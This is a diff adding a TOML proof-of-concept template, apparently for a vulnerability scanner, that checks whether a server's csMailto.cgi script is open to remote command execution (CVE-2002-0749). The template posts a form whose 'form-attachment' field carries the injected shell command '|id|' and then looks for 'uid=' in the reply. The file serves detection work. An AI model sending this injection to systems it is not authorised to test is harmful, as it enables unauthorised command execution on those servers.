@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "检测目标服务器是否运行存在远程命令执行漏洞的 csMailto.cgi 脚本，通过在 form-attachment 参数中注入 shell 元字符执行 id 命令并检测输出验证漏洞"
+id = "POC-AVE-2002-0420"
+name = "CGIScript.net csMailto.cgi Remote Command Execution PoC"
+severity = "high"
+tags = ["ave-2002-0420"]
+vuln_id = [
+    "CVE-2002-0749",
+    "AVE-2002-0420",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/csMailto.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "form-attachment=|id|&form-autoresponse=1&Email=test@test.com"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
